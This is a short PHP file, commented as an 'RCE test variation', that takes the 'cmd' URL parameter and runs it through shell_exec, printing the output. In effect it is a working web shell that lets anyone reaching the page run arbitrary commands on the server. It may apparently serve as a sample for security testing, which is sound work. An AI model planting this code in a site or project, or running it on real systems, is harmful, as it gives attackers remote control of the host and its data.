<?php
// RCE test variation #1237
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>